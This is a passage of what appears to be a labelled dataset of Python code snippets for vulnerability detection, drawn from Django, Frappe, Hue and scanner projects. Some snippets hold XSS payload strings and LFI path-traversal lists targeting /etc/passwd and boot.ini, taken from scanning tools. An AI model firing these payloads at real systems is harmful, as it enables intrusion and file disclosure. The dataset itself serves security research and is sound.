".format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns", "label": 0}, {"snippet_id": 36351, "code": " \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to", "label": 0}, {"snippet_id": 19680, "code": " test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh,", "label": 0}, {"snippet_id": 45165, "code": "[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid", "label": 0}, {"snippet_id": 9275, "code": "[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*", "label": 0}, {"snippet_id": 39303, "code": "\t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns", "label": 0}, {"snippet_id": 28825, "code": "\tssh.connect(hostname=serv, port= ssh_port, username=ssh_user_name, pkey=k) \t\telse: \t\t\tssh.connect(hostname=serv, port= ssh_port, username=ssh_user_name, password=ssh_user_password) \t\treturn ssh \texcept", "label": 0}, {"snippet_id": 34889, "code": " \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key):", "label": 0}, {"snippet_id": 21293, "code": ".index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook", "label": 1}, {"snippet_id": 7531, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 16733, "code": "*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^", "label": 1}, {"snippet_id": 37316, "code": " on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self", "label": 0}, {"snippet_id": 42557, "code": "\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info", "label": 0}, {"snippet_id": 42024, "code": "\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) ", "label": 0}, {"snippet_id": 16316, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\"", "label": 0}, {"snippet_id": 14248, "code": " if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete", "label": 0}, {"snippet_id": 49210, "code": ".get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def get_reverse_sort_by(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)", "label": 0}, {"snippet_id": 29624, "code": " in stderr.read().decode(encoding='UTF-8'): \t\t\tif line: \t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\") \ttry:\t \t\tssh.close() \texcept: \t\tprint(\"<div class='alert alert-danger' style='margin", "label": 0}, {"snippet_id": 46298, "code": " render(template, request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'autoLoad': True, 'collections': collections, 'layout':[ {\"size\":12,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":", "label": 0}, {"snippet_id": 26651, "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '../../boot.ini', '../../../boot.ini', '../../../../boot.ini', '../../../../../boot.ini', '../../../../../../boot.ini', '../../../../../../../boot.ini', '..", "label": 0}, {"snippet_id": 14269, "code": ".views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url", "label": 0}, {"snippet_id": 38938, "code": "=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 ", "label": 0}, {"snippet_id": 28973, "code": "\t\tlog=open(log_path +\"/config_edit-\"+get_data('logs')+\".log\", \"a\") \t\tlog.write(diff) \t\tlog.close \texcept IOError: \t\tprint('<center><div class=\"alert alert-danger\">Can\\'t read write change to log. %s</div", "label": 0}, {"snippet_id": 44204, "code": ".i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials from liboozie.oozie_api import get_oozie", "label": 0}, {"snippet_id": 48334, "code": " int=int(request.POST[\"quantity\"]) notes: str=request.POST[\"notes\"] ar=ArticleRequested() ar.AID=Article.objects.get(id=aid) ar.RID=current_reservation if \"srid\" in request.GET: ar.SRID=SubReservation.objects", "label": 1}, {"snippet_id": 27525, "code": " account url.\"\"\" return '/logout?' +urllib.parse.urlencode({ 'csrf_token': form.generate_csrf_token(), 'dest': dest_url, }) class _MenuItem(object): \"\"\"A menu item used for rendering an item in the main", "label": 0}, {"snippet_id": 26439, "code": ";</script>\", \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\", \"<img src=test123456.jpg onerror=alert(1)>\"] lfi_attacks=[ '../../etc/passwd', '../../../etc/passwd', '..", "label": 0}, {"snippet_id": 13659, "code": ", name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',", "label": 1}, {"snippet_id": 27067, "code": "(form_counter) +\"_\" +str(counter) +\".html\", \"w\") as f: f.write(r.content) for lfi_result in lfi_expect: if r.content.find(lfi_result)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s", "label": 0}, {"snippet_id": 51425, "code": ".dirname(os.path.abspath(__file__)) SETTINGS_PATH=os.path.normpath(os.path.dirname(__file__)) SECRET_KEY='_dzlo^9d DEBUG=True ALLOWED_HOSTS=[] INSTALLED_APPS=[ 'constance', 'constance.backends.database'", "label": 0}, {"snippet_id": 24630, "code": "!=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with", "label": 0}, {"snippet_id": 16938, "code": "]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses", "label": 0}, {"snippet_id": 5158, "code": " cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload)", "label": 0}, {"snippet_id": 36221, "code": "\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr", "label": 0}, {"snippet_id": 5616, "code": ">', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG", "label": 0}, {"snippet_id": 16091, "code": "=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student", "label": 0}, {"snippet_id": 44543, "code": " layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid", "label": 0}, {"snippet_id": 37702, "code": ", t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand", "label": 0}, {"snippet_id": 48127, "code": "(low_res_file_name) m.text=text m.cachedText=compile_markdown(text) m.category=category m.highResFile=\"/\" +high_res_file_name m.lowResFile=\"/\" +low_res_file_name m.headline=headline m.save() mu: MediaUpload=MediaUpload", "label": 1}, {"snippet_id": 7628, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*", "label": 1}, {"snippet_id": 39983, "code": ").format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname", "label": 0}, {"snippet_id": 23083, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 17132, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 41715, "code": "] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d):", "label": 0}, {"snippet_id": 53467, "code": "', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']]) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) bundle_doc.dependencies=dependencies bundle_doc.update_data", "label": 0}, {"snippet_id": 21502, "code": ", url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading", "label": 0}, {"snippet_id": 7655, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(", "label": 1}, {"snippet_id": 18073, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>", "label": 0}, {"snippet_id": 17703, "code": "), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/", "label": 0}, {"snippet_id": 26089, "code": " self.all_optional: self.initial['is_business']=True self.fields['is_business'].widget=BusinessBooleanRadio(require_business=True) self.fields['company'].required=True self.fields['company'].widget.is_required", "label": 0}, {"snippet_id": 24611, "code": ") def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if", "label": 0}, {"snippet_id": 13011, "code": ".contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE')", "label": 0}, {"snippet_id": 13203, "code": "]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete", "label": 0}, {"snippet_id": 27411, "code": "('Cannot serialise %s' % obj) def format_time(dt): \"\"\"Format datetime object for display.\"\"\" return '{t.day}{t:%b}{t:%y}{t:%X} PDT'.format(t=dt) def splitlines(text): \"\"\"Split text into lines.\"\"\" return", "label": 0}, {"snippet_id": 45602, "code": ".get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request", "label": 0}, {"snippet_id": 7675, "code": "/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index", "label": 1}, {"snippet_id": 25506, "code": " value)): raise forms.ValidationError(self.error_messages['required'], code='required') if self.require_all_fields and not all(v for v in value): raise forms.ValidationError(self.error_messages['incomplete", "label": 0}, {"snippet_id": 16849, "code": "/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)", "label": 0}, {"snippet_id": 48367, "code": "\" not in request.GET: return HttpResponseRedirect(\"/admin?error=missing%20group%20id\") g: ArticleGroup=ArticleGroup.objects.get(id=int(request.GET[\"group_id\"])) for art in Article.objects.all().filter(group", "label": 0}, {"snippet_id": 47512, "code": "\")) f.add_content(TextField(name='email', button_text=str(profile.authuser.email))) f.add_content(PlainText(\"Display name: \")) f.add_content(TextField(name='display_name', button_text=profile.displayName", "label": 0}, {"snippet_id": 36536, "code": ", list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) ", "label": 0}, {"snippet_id": 35490, "code": "(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[", "label": 0}, {"snippet_id": 24665, "code": "), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets", "label": 0}, {"snippet_id": 36118, "code": ".meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision", "label": 0}, {"snippet_id": 41335, "code": "\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route", "label": 0}, {"snippet_id": 27494, "code": "}' % v) def add_menu(name, href): \"\"\"Add menu item to the main navigation.\"\"\" _MENU_ITEMS.append(_MenuItem(name, href)) def make_login_url(dest_url): \"\"\"Make the switch account url.\"\"\" return '/login?'", "label": 0}, {"snippet_id": 41908, "code": "\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value", "label": 0}, {"snippet_id": 9333, "code": "\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$", "label": 0}, {"snippet_id": 31640, "code": ".y_range.end=int(df['conn'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t \t\tp[serv].line(\"Date\", \"conn\", source=source, alpha=0.5, color=' \t\tp[serv].legend.orientation", "label": 0}, {"snippet_id": 49596, "code": " self.search_query_value=self.query_params.get(search_query_param, '') self.search_query_param=search_query_param self.ordering_query_value=self.query_params.get(ordering_query_param, '') self.ordering_query_param", "label": 0}, {"snippet_id": 50540, "code": " to be done, such as initializing or sending/receving data through the request. It uses a long-polling mechanism to avoid sending data unless there is actual data available. Args: request(Request): Incoming", "label": 0}, {"snippet_id": 29672, "code": ".Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True) \tstdout, stderr=p.communicate() \toutput=stdout.splitlines() \t \treturn output, stderr def show_backends(serv", "label": 0}, {"snippet_id": 7823, "code": "/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url", "label": 0}, {"snippet_id": 54046, "code": "\".format(target.get(),datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"))) crl=[target.get()] if crawl.get()=='On': crl+=bane.crawl(target.get(),bypass=True) pr=proxy.get() if len(pr)==0: pr=None if method.get", "label": 0}, {"snippet_id": 10476, "code": " run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout", "label": 0}, {"snippet_id": 42907, "code": " \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t", "label": 0}, {"snippet_id": 11230, "code": "), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd", "label": 0}, {"snippet_id": 50205, "code": " dataentries=self.databuffer.get(csessid,[]) dataentries.append(jsonify(data)) self.databuffer[csessid]=dataentries def client_disconnect(self, csessid): \"\"\" Disconnect session with given csessid. Args", "label": 0}, {"snippet_id": 14117, "code": "'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes", "label": 0}, {"snippet_id": 51691, "code": " USE_I18N=True USE_L10N=True USE_TZ=True LOCALE_PATHS=['locale'] LANGUAGE_COOKIE_NAME='dashboard_language' STATIC_URL='/static/' if DEBUG: STATIC_ROOT='static' else: STATIC_ROOT='/srv/dashboard/static/", "label": 0}, {"snippet_id": 53815, "code": " import BeautifulSoup import requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page", "label": 1}, {"snippet_id": 37088, "code": "\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere", "label": 0}, {"snippet_id": 51606, "code": "': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'test':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'production':{ ", "label": 0}, {"snippet_id": 30663, "code": " |tail -%s %s %s\" %(log_path +viewlog, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if serv is not None and act==\"showMap\": ", "label": 0}, {"snippet_id": 5701, "code": "<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=", "label": 0}, {"snippet_id": 50284, "code": ".init_session(\"ajax/comet\", remote_addr, self.sessionhandler) sess.csessid=csessid csession=_CLIENT_SESSIONS(session_key=sess.csessid) uid=csession and csession.get(\"webclient_authenticated_uid\", False", "label": 0}, {"snippet_id": 15453, "code": ": pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly:", "label": 0}, {"snippet_id": 47058, "code": " import Markup from sqlalchemy.exc import SQLAlchemyError from.api import Record from.models import RecordMetadata class RecordMetadataModelView(ModelView): \"\"\"Records admin model view.\"\"\" filter_converter", "label": 0}, {"snippet_id": 30599, "code": ", date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if form.getvalue('viewlogs') is not None: \tviewlog=form.getvalue('viewlogs')", "label": 0}, {"snippet_id": 12957, "code": " edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug", "label": 0}, {"snippet_id": 33488, "code": ".utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe", "label": 1}, {"snippet_id": 40044, "code": " self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe", "label": 0}, {"snippet_id": 53674, "code": ".update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException", "label": 0}, {"snippet_id": 44967, "code": "=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return", "label": 0}, {"snippet_id": 48413, "code": " +str(art.id)]) if amount > 0: ar=ArticleRequested() ar.AID=art ar.RID=current_reservation ar.amount=amount if \"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])) ar.notes", "label": 1}, {"snippet_id": 33101, "code": " import decorators from components import endpoints_webapp2 from components import prpc import webapp2 from legacy import api as legacy_api from legacy import swarmbucket_api import access import api import", "label": 0}, {"snippet_id": 10607, "code": " test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite", "label": 0}, {"snippet_id": 25449, "code": ") or self.widget)( scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs',{}) ) defaults.update(**kwargs) for fname, label, size in self.scheme['fields']: defaults['label']=label field=forms.CharField", "label": 0}, {"snippet_id": 45461, "code": " mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy() properties", "label": 0}, {"snippet_id": 25379, "code": "-group\">%s</div>' % ''.join(rendered_widgets) class NamePartsFormField(forms.MultiValueField): widget=NamePartsWidget def compress(self, data_list) -> dict: data={} data['_scheme']=self.scheme_name for", "label": 0}, {"snippet_id": 26593, "code": "%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e", "label": 0}, {"snippet_id": 2561, "code": ", \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param", "label": 0}, {"snippet_id": 52290, "code": "(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace", "label": 0}, {"snippet_id": 34146, "code": ", set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType", "label": 0}, {"snippet_id": 50209, "code": "(csessid,[]) dataentries.append(jsonify(data)) self.databuffer[csessid]=dataentries def client_disconnect(self, csessid): \"\"\" Disconnect session with given csessid. Args: csessid(int): Session id. \"\"\" if", "label": 0}, {"snippet_id": 33790, "code": ".title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"", "label": 1}, {"snippet_id": 10903, "code": " def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING", "label": 0}, {"snippet_id": 31131, "code": ", tmp_config_path, script) \t \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp]) \tfunct.ssh_command(slave,[\"sudo chmod +x", "label": 0}, {"snippet_id": 2996, "code": "'+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to", "label": 0}, {"snippet_id": 5813, "code": "(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads def __init__(self, url=\"\"):", "label": 0}, {"snippet_id": 48407, "code": "%20data%20in%20request\") amount=int(request.POST[\"quantity_\" +str(art.id)]) if amount > 0: ar=ArticleRequested() ar.AID=art ar.RID=current_reservation ar.amount=amount if \"srid\" in request.GET: ar.SRID", "label": 0}, {"snippet_id": 4043, "code": " is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, ", "label": 0}, {"snippet_id": 26586, "code": ", '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00", "label": 0}, {"snippet_id": 54630, "code": " 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return queryset class ArticleDetail(DetailView, FormMixin): \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002 \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002 \"\"\" model=Article context_object_name", "label": 1}, {"snippet_id": 7738, "code": "(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index", "label": 0}, {"snippet_id": 42980, "code": "\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, 